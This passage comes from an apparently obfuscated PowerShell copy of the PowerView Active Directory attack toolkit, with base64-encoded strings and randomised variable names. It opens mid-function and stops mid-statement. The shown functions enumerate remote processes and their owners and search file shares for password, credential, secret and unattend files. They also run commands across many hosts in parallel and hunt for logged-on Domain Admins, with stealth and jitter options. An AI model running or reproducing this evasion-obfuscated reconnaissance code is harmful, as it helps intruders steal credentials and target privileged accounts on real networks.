([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIA
BFAHIAcgBvAHIAOgAgACQAXwA=')))
                    }
                
}
            }
            catch {
                Write-Warning 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFIAZQBnAE0AbwB1AG4AdABlAGQARAByAGkAdgBlAF0AIA
BFAHIAcgBvAHIAIABhAGMAYwBlAHMAcwBpAG4AZwAgACQAewA5AGMAMABiAGEAZQBjAD
gANQA5ADcAMwA0AGYAYwA5ADgAMwBlAGUAMwBjADAANABiADQAYwBkAGUAOABhADcAfQ
AsACAAbABpAGsAZQBsAHkAIABpAG4AcwB1AGYAZgBpAGMAaQBlAG4AdAAgAHAAZQByAG
0AaQBzAHMAaQBvAG4AcwAgAG8AcgAgAGYAaQByAGUAdwBhAGwAbAAgAHIAdQBsAGUAcw
AgAG8AbgAgAGgAbwBzAHQAOgAgACQAXwA=')))
            }
        }
    }
}
function Get-WMIProcess {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
ValueFromPipeline = $True, ValueFromPipelineByPropertyName = 
$True)]
        [Alias('HostName', 'dnshostname', 'name')]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 
'localhost',
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        
ForEach (${9c0baec859734fc983ee3c04b4cde8a7} in $ComputerName) {
     
       try {
                ${43b8dc0c32f0440fb33a464b6fbce115} = @
{
                    'ComputerName' = $ComputerName
                  
  'Class' = $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('VwBpAG4AMwAyAF8AcAByAG8AYwBlAHMAcwA=')))
                }
          
      if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { 
${43b8dc0c32f0440fb33a464b6fbce115}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                
Get-WMIobject @43b8dc0c32f0440fb33a464b6fbce115 | ForEach-Object {
   
                 ${e8405a3adfdb49119745ca380f2845e6} = $_.getowner
();
                    ${3139d971e1ae482d8eee69861eb17ea0} = New-
Object PSObject
                    
${3139d971e1ae482d8eee69861eb17ea0} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) 
${9c0baec859734fc983ee3c04b4cde8a7}
                    
${3139d971e1ae482d8eee69861eb17ea0} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AYwBlAHMAcwBOAGEAbQBlAA=='))) $_.ProcessName
                
    ${3139d971e1ae482d8eee69861eb17ea0} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UAByAG8AYwBlAHMAcwBJAEQA'))) $_.ProcessID
                    
${3139d971e1ae482d8eee69861eb17ea0} | Add-Member Noteproperty 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RABvAG0AYQBpAG4A'))) ${e8405a3adfdb49119745ca380f2845e6}.Domain
    
                ${3139d971e1ae482d8eee69861eb17ea0} | Add-Member 
Noteproperty $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('VQBzAGUAcgA='))) 
${e8405a3adfdb49119745ca380f2845e6}.User
                    
${3139d971e1ae482d8eee69861eb17ea0}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAFAAcgBvAGMAZQBzAHMA'))))
      
              ${3139d971e1ae482d8eee69861eb17ea0}
                }
   
         }
            catch {
                Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBHAGUAdAAtAFcATQBJAFAAcgBvAGMAZQBzAHMAXQAgAEUAcgByAG8AcgAgAGUAbg
B1AG0AZQByAGEAdABpAG4AZwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwBlAH
MAIABvAG4AIAAnACQAewA5AGMAMABiAGEAZQBjADgANQA5ADcAMwA0AGYAYwA5ADgAMw
BlAGUAMwBjADAANABiADQAYwBkAGUAOABhADcAfQAnACwAIABhAGMAYwBlAHMAcwAgAG
wAaQBrAGUAbAB5ACAAZABlAG4AaQBlAGQAOgAgACQAXwA=')))
            }
      
  }
    }
}
function Find-InterestingFile {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    
[CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        
[ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',
    
    [Parameter(ParameterSetName = 'FileSpecification')]
        
[ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
    
    [String[]]
        $Include = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBwAGEAcwBzAHcAbwByAGQAKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBzAGUAbgBzAGkAdABpAHYAZQAqAA=='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBhAGQAbQBpAG4AKgA='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgBsAG8AZwBpAG4AKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBzAGUAYwByAGUAdAAqAA=='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dQBuAGEAdAB0AGUAbgBkACoALgB4AG0AbAA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAHYAbQBkAGsA'))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgBjAHIAZQBkAHMAKgA='))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgBjAHIAZQBkAGUAbgB0AGkAYQBsACoA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAGMAbwBuAGYAaQBnAA==')))),
        [Parameter(ParameterSetName 
= 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        
[DateTime]
        $LastAccessTime,
        [Parameter
(ParameterSetName = 'FileSpecification')]
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        $LastWriteTime,
  
      [Parameter(ParameterSetName = 'FileSpecification')]
        
[ValidateNotNullOrEmpty()]
        [DateTime]
        $CreationTime,
   
     [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
    
    $OfficeDocs,
        [Parameter(ParameterSetName = 'FreshEXEs')]
  
      [Switch]
        $FreshEXEs,
        [Parameter(ParameterSetName 
= 'FileSpecification')]
        [Switch]
        $ExcludeFolders,
      
  [Parameter(ParameterSetName = 'FileSpecification')]
        
[Switch]
        $ExcludeHidden,
        [Switch]
        
$CheckWriteAccess,
        [Management.Automation.PSCredential]
       
 [Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        
${ea43c787582f45539b7f519da4680c7a} =  @{
            'Recurse' = 
$True
            'ErrorAction' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQA=')))
            
'Include' = $Include
        }
        if ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TwBmAGYAaQBjAGUARABvAGMAcwA=')))]) {
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGMAbAB1AGQAZQA=')))] = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAGQAbwBjAA=='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgAuAGQAbwBjAHgA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAHgAbABzAA=='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgAuAHgAbABzAHgA'))), 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAHAAcAB0AA=='))), $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('KgAuAHAAcAB0AHgA'))))
        }
        
elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('RgByAGUAcwBoAEUAWABFAHMA')))]) {
       
     $LastAccessTime = (Get-Date).AddDays(-7).ToString
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBNAC8AZABkAC8AeQB5AHkAeQA='))))
            
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAGMAbAB1AGQAZQA=')))] = @
($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('KgAuAGUAeABlAA=='))))
        }
        
${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RgBvAHIAYwBlAA==')))] = -not $PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQB4AGMAbAB1AGQAZQBIAGkAZABkAGUAbgA=')))]
        
${6a36a79de18f43b1a0a59794f4ad66dc} = @{}
        function Test-Write 
{
            [CmdletBinding()]Param([String]$Path)
            try {
  
              ${4381464694a3406d844d5aa5124d3e68} = 
[IO.File]::OpenWrite($Path)
                
${4381464694a3406d844d5aa5124d3e68}.Close()
                $True
     
       }
            catch {
                $False
            }
       
 }
    }
    PROCESS {
        ForEach 
(${2b1cd794316846babc6cf4a4a6510811} in $Path) {
            if 
((${2b1cd794316846babc6cf4a4a6510811} -Match 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('XABcAFwAXAAuACoAXABcAC4AKgA=')))) -and ($PSBoundParameters
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QwByAGUAZABlAG4AdABpAGEAbAA=')))])) {
                
${9275e39a12134a3fa8e1806664964155} = (New-Object System.Uri
(${2b1cd794316846babc6cf4a4a6510811})).Host
                if (-not 
${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}]) {
                    Add-
RemoteConnection -ComputerName ${9275e39a12134a3fa8e1806664964155} 
-Credential $Credential
                    
${6a36a79de18f43b1a0a59794f4ad66dc}
[${9275e39a12134a3fa8e1806664964155}] = $True
                }
       
     }
            ${ea43c787582f45539b7f519da4680c7a}
[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABhAHQAaAA=')))] = ${2b1cd794316846babc6cf4a4a6510811}
            
Get-ChildItem @ea43c787582f45539b7f519da4680c7a | ForEach-Object {
   
             ${417c070585854c20aed074f685b4ea33} = $True
             
   if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RQB4AGMAbAB1AGQAZQBGAG8AbABkAGUAcgBzAA==')))] -and 
($_.PSIsContainer)) {
                    Write-Verbose "Excluding: 
$($_.FullName)"
                    
${417c070585854c20aed074f685b4ea33} = $False
                }
        
        if ($LastAccessTime -and ($_.LastAccessTime -lt 
$LastAccessTime)) {
                    
${417c070585854c20aed074f685b4ea33} = $False
                }
        
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('TABhAHMAdABXAHIAaQB0AGUAVABpAG0AZQA=')))] -and ($_.LastWriteTime 
-lt $LastWriteTime)) {
                    
${417c070585854c20aed074f685b4ea33} = $False
                }
        
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwByAGUAYQB0AGkAbwBuAFQAaQBtAGUA')))] 
-and ($_.CreationTime -lt $CreationTime)) {
                    
${417c070585854c20aed074f685b4ea33} = $False
                }
        
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBoAGUAYwBrAFcAcgBpAHQAZQBBAGMAYwBlAHMAcwA=')))] -and (-not 
(Test-Write -Path $_.FullName))) {
                    
${417c070585854c20aed074f685b4ea33} = $False
                }
        
        if (${417c070585854c20aed074f685b4ea33}) {
                   
 ${f877ad854b1e40d8ae63f951c5bc75c0} = @{
                        
'Path' = $_.FullName
                        'Owner' = $((Get-Acl 
$_.FullName).Owner)
                        'LastAccessTime' = 
$_.LastAccessTime
                        'LastWriteTime' = 
$_.LastWriteTime
                        'CreationTime' = 
$_.CreationTime
                        'Length' = $_.Length
          
          }
                    ${78e54899df2f450f975c34a543e94bcf} = 
New-Object -TypeName PSObject -Property 
${f877ad854b1e40d8ae63f951c5bc75c0}
                    
${78e54899df2f450f975c34a543e94bcf}.PSObject.TypeNames.Insert(0, 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AdQBuAGQARgBpAGwAZQA='))))
          
          ${78e54899df2f450f975c34a543e94bcf}
                }
       
     }
        }
    }
    END {
        
${6a36a79de18f43b1a0a59794f4ad66dc}.Keys | Remove-RemoteConnection
   
 }
}
function New-ThreadedFunction {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSUseShouldProcessForStateChangingFunctions', '')]
    
[CmdletBinding()]
    Param(
        [Parameter(Position = 0, 
Mandatory = $True, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [String[]]
        
$ComputerName,
        [Parameter(Position = 1, Mandatory = $True)]
   
     [System.Management.Automation.ScriptBlock]
        
$ScriptBlock,
        [Parameter(Position = 2)]
        [Hashtable]
    
    $ScriptParameters,
        [Int]
        [ValidateRange(1,  100)]
  
      $Threads = 20,
        [Switch]
        $NoImports
    )
    BEGIN 
{
        ${1ada151100af49d29f86a27c87dd6175} = 
[System.Management.Automation.Runspaces.InitialSessionState]::Create
Default()
        ${1ada151100af49d29f86a27c87dd6175}.ApartmentState 
= [System.Threading.ApartmentState]::STA
        if (-not $NoImports) 
{
            ${cbcd7db989fb4fc1acb0e54ef1ff0015} = Get-Variable -
Scope 2
            ${632c4a84673e4012901d20f9e8831bb9} = @('?',
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('YQByAGcAcwA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('QwBvAG4AcwBvAGwAZQBGAGkAbABlAE4AYQBtAGUA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('RQByAHIAbwByAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('RQB4AGUAYwB1AHQAaQBvAG4AQwBvAG4AdABlAHgAdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZgBhAGwAcwBlAA=='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('SABPAE0ARQA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SABvAHMAdAA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('aQBuAHAAdQB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('SQBuAHAAdQB0AE8AYgBqAGUAYwB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBBAGwAaQBhAHMAQwBvAHUAbgB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBEAHIAaQB2AGUAQwBvAHUAbgB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBFAHIAcgBvAHIAQwBvAHUAbgB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBGAHUAbgBjAHQAaQBvAG4AQwBvAHUAbgB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBIAGkAcwB0AG8AcgB5AEMAbwB1AG4AdAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQBhAHgAaQBtAHUAbQBWAGEAcgBpAGEAYgBsAGUAQwBvAHUAbgB0AA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('TQB5AEkAbgB2AG8AYwBhAHQAaQBvAG4A'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('bgB1AGwAbAA='))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UABJAEQA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAEIAbwB1AG4AZABQAGEAcgBhAG0AZQB0AGUAcgBzAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAEMAbwBtAG0AYQBuAGQAUABhAHQAaAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAEMAdQBsAHQAdQByAGUA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String
('UABTAEQAZQBmAGEAdQBsAHQAUABhAHIAYQBtAGUAdABlAHIAVgBhAGwAdQBlAHMA')
)),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAEgATwBNAEUA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UABTAFMAYwByAGkAcAB0AFIAbwBvAHQA'))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAFUASQBDAHUAbAB0AHUAcgBlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABTAFYAZQByAHMAaQBvAG4AVABhAGIAbABlAA=='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UABXAEQA'))),$([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('UwBoAGUAbABsAEkAZAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('UwB5AG4AYwBoAHIAbwBuAGkAegBlAGQASABhAHMAaAA='))),
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('dAByAHUAZQA='))))
            ForEach 
(${ab4e04b359b34db8a48d93cbe13e702b} in 
${cbcd7db989fb4fc1acb0e54ef1ff0015}) {
                if 
(${632c4a84673e4012901d20f9e8831bb9} -NotContains 
${ab4e04b359b34db8a48d93cbe13e702b}.Name) {
                
${1ada151100af49d29f86a27c87dd6175}.Variables.Add((New-Object -
TypeName 
System.Management.Automation.Runspaces.SessionStateVariableEntry -
ArgumentList ${ab4e04b359b34db8a48d93cbe13e702b}.name,
${ab4e04b359b34db8a48d93cbe13e702b}.Value,
${ab4e04b359b34db8a48d93cbe13e702b}.description,
${ab4e04b359b34db8a48d93cbe13e702b}.options,
${ab4e04b359b34db8a48d93cbe13e702b}.attributes))
                }
    
        }
            ForEach (${07b6cf350b584cd88d656e4eca728c65} in 
(Get-ChildItem Function:)) {
                
${1ada151100af49d29f86a27c87dd6175}.Commands.Add((New-Object -
TypeName 
System.Management.Automation.Runspaces.SessionStateFunctionEntry -
ArgumentList ${07b6cf350b584cd88d656e4eca728c65}.Name, 
${07b6cf350b584cd88d656e4eca728c65}.Definition))
            }
        
}
        ${e126fa02a88542dbb023668a1ceef7c2} = 
[RunspaceFactory]::CreateRunspacePool(1, $Threads, 
${1ada151100af49d29f86a27c87dd6175}, $Host)
        
${e126fa02a88542dbb023668a1ceef7c2}.Open()
        $Method = $Null
    
    ForEach (${e9b44dbba297478a9f568d5f60948cd9} in 
[PowerShell].GetMethods() | Where-Object { $_.Name -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('QgBlAGcAaQBuAEkAbgB2AG8AawBlAA=='))) }) {
            
${43565d24d14b4c998f198a159ee995ac} = 
${e9b44dbba297478a9f568d5f60948cd9}.GetParameters()
            if 
((${43565d24d14b4c998f198a159ee995ac}.Count -eq 2) -and 
${43565d24d14b4c998f198a159ee995ac}[0].Name -eq 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('aQBuAHAAdQB0AA=='))) -and ${43565d24d14b4c998f198a159ee995ac}
[1].Name -eq $([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('bwB1AHQAcAB1AHQA')))) {
                
$Method = ${e9b44dbba297478a9f568d5f60948cd9}.MakeGenericMethod
([Object], [Object])
                break
            }
        }
      
  ${b21dd832557f444d881d6d01541c1231} = @()
        $ComputerName = 
$ComputerName | Where-Object {$_ -and $_.Trim()}
        Write-
Verbose "[New-ThreadedFunction] Total number of hosts: 
$($ComputerName.count)"
        if ($Threads -ge 
$ComputerName.Length) {
            $Threads = $ComputerName.Length
   
     }
        ${69cf6c15b5e6416ca93df4ab87b7e8ff} = [Int]
($ComputerName.Length/$Threads)
        
${f9ef7d6f14ac42189e78f11cbc20b78a} = @()
        
${3b309d5c74884e60964153540d3939a0} = 0
        
${ac372ddf2c1a49a4afb777e258d58244} = 
${69cf6c15b5e6416ca93df4ab87b7e8ff}
        for
(${9e5bb180fda8451b8ec7f5d4ed0667a4} = 1; 
${9e5bb180fda8451b8ec7f5d4ed0667a4} -le $Threads; 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
            
${81d67b9ad18a4c1b8df52f912c779eb4} = New-Object 
System.Collections.ArrayList
            if 
(${9e5bb180fda8451b8ec7f5d4ed0667a4} -eq $Threads) {
                
${ac372ddf2c1a49a4afb777e258d58244} = $ComputerName.Length
           
 }
            ${81d67b9ad18a4c1b8df52f912c779eb4}.AddRange
($ComputerName[${3b309d5c74884e60964153540d3939a0}..
(${ac372ddf2c1a49a4afb777e258d58244}-1)])
            
${3b309d5c74884e60964153540d3939a0} += 
${69cf6c15b5e6416ca93df4ab87b7e8ff}
            
${ac372ddf2c1a49a4afb777e258d58244} += 
${69cf6c15b5e6416ca93df4ab87b7e8ff}
            
${f9ef7d6f14ac42189e78f11cbc20b78a} += @(,@
(${81d67b9ad18a4c1b8df52f912c779eb4}.ToArray()))
        }
        
Write-Verbose $ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAbw
B0AGEAbAAgAG4AdQBtAGIAZQByACAAbwBmACAAdABoAHIAZQBhAGQAcwAvAHAAYQByAH
QAaQB0AGkAbwBuAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
        ForEach 
(${212c5ab3e3a94473afbdfa64c55be81a} in 
${f9ef7d6f14ac42189e78f11cbc20b78a}) {
            
${7d68339c51e84025a7902ade6468f98c} = [PowerShell]::Create()
         
   ${7d68339c51e84025a7902ade6468f98c}.runspacepool = 
${e126fa02a88542dbb023668a1ceef7c2}
            $Null = 
${7d68339c51e84025a7902ade6468f98c}.AddScript
($ScriptBlock).AddParameter($([Text.Encoding]::Unicode.GetString
([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))), 
${212c5ab3e3a94473afbdfa64c55be81a})
            if 
($ScriptParameters) {
                ForEach 
(${0ec9009aa3e6453db9c4c88716662867} in 
$ScriptParameters.GetEnumerator()) {
                    $Null = 
${7d68339c51e84025a7902ade6468f98c}.AddParameter
(${0ec9009aa3e6453db9c4c88716662867}.Name, 
${0ec9009aa3e6453db9c4c88716662867}.Value)
                }
          
  }
            ${5cfffc0ad0f94214bae0585e8079600f} = New-Object 
Management.Automation.PSDataCollection[Object]
            
${b21dd832557f444d881d6d01541c1231} += @{
                PS = 
${7d68339c51e84025a7902ade6468f98c}
                Output = 
${5cfffc0ad0f94214bae0585e8079600f}
                Result = 
$Method.Invoke(${7d68339c51e84025a7902ade6468f98c}, @($Null, 
[Management.Automation.PSDataCollection
[Object]]${5cfffc0ad0f94214bae0585e8079600f}))
            }
        
}
    }
    END {
        Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFQAaA
ByAGUAYQBkAHMAIABlAHgAZQBjAHUAdABpAG4AZwA=')))
        Do {
           
 ForEach (${321f60ee0dba4a8e9a32dd596fdf1fe5} in 
${b21dd832557f444d881d6d01541c1231}) {
                
${321f60ee0dba4a8e9a32dd596fdf1fe5}.Output.ReadAll()
            }
    
        Start-Sleep -Seconds 1
        }
        While 
((${b21dd832557f444d881d6d01541c1231} | Where-Object { -not 
$_.Result.IsCompleted }).Count -gt 0)
        
${7f5f5276bf29431fb25edfe133150179} = 100
        Write-Verbose 
$ExecutionContext.InvokeCommand.ExpandString
([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAFcAYQ
BpAHQAaQBuAGcAIAAkAHsANwBmADUAZgA1ADIANwA2AGIAZgAyADkANAAzADEAZgBiAD
IANQBlAGQAZgBlADEAMwAzADEANQAwADEANwA5AH0AIABzAGUAYwBvAG4AZABzACAAZg
BvAHIAIABmAGkAbgBhAGwAIABjAGwAZQBhAG4AdQBwAC4ALgAuAA==')))
        
for (${9e5bb180fda8451b8ec7f5d4ed0667a4}=0; 
${9e5bb180fda8451b8ec7f5d4ed0667a4} -lt 
${7f5f5276bf29431fb25edfe133150179}; 
${9e5bb180fda8451b8ec7f5d4ed0667a4}++) {
            ForEach 
(${321f60ee0dba4a8e9a32dd596fdf1fe5} in 
${b21dd832557f444d881d6d01541c1231}) {
                
${321f60ee0dba4a8e9a32dd596fdf1fe5}.Output.ReadAll()
                
${321f60ee0dba4a8e9a32dd596fdf1fe5}.PS.Dispose()
            }
        
    Start-Sleep -S 1
        }
        
${e126fa02a88542dbb023668a1ceef7c2}.Dispose()
        Write-Verbose 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('WwBOAGUAdwAtAFQAaAByAGUAYQBkAGUAZABGAHUAbgBjAHQAaQBvAG4AXQAgAGEAbA
BsACAAdABoAHIAZQBhAGQAcwAgAGMAbwBtAHAAbABlAHQAZQBkAA==')))
    }
}
function Find-DomainUserLocation {
    
[Diagnostics.CodeAnalysis.SuppressMessageAttribute
('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
   
 [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    
Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, 
ValueFromPipelineByPropertyName = $True)]
        [Alias
('DNSHostName')]
        [String[]]
        $ComputerName,
        
[ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        
[ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
   
     [ValidateNotNullOrEmpty()]
        [String]
        
$ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        
[String]
        $ComputerSearchBase,
        [Alias
('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
    
    [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
     
   [String]
        $ComputerOperatingSystem,
        
[ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        
[String]
        $ComputerServicePack,
        
[ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        
[String]
        $ComputerSiteName,
        [Parameter
(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty
()]
        [String[]]
        $UserIdentity,
        
[ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
       
 [ValidateNotNullOrEmpty()]
        [String]
        $UserLDAPFilter,
  
      [ValidateNotNullOrEmpty()]
        [String]
        
$UserSearchBase,
        [Parameter(ParameterSetName = 
'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        
[Alias('GroupName', 'Group')]
        [String[]]
        
$UserGroupIdentity = 'Domain Admins',
        [Alias('AdminCount')]
   
     [Switch]
        $UserAdminCount,
        [Alias
('AllowDelegation')]
        [Switch]
        $UserAllowDelegation,
    
    [Switch]
        $CheckAccess,
        [ValidateNotNullOrEmpty()]
  
      [Alias('DomainController')]
        [String]
        $Server,
    
    [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
     
   $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        
[Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 
10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        
$Tombstone,
        [Management.Automation.PSCredential]
        
[Management.Automation.CredentialAttribute()]
        $Credential = 
[Management.Automation.PSCredential]::Empty,
        [Switch]
        
$StopOnSuccess,
        [ValidateRange(1, 10000)]
        [Int]
        
$Delay = 0,
        [ValidateRange(0.0, 1.0)]
        [Double]
        
$Jitter = .3,
        [Parameter(ParameterSetName = 'ShowAll')]
       
 [Switch]
        $ShowAll,
        [Switch]
        $Stealth,
        
[String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        
$StealthSource = 'All',
        [Int]
        [ValidateRange(1, 100)]
  
      $Threads = 20
    )
    BEGIN {
        
${3cb1483537e3424195869ccaa8e07f42} = @{
            'Properties' = 
$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String
('ZABuAHMAaABvAHMAdABuAGEAbQBlAA==')))
        }
        if 
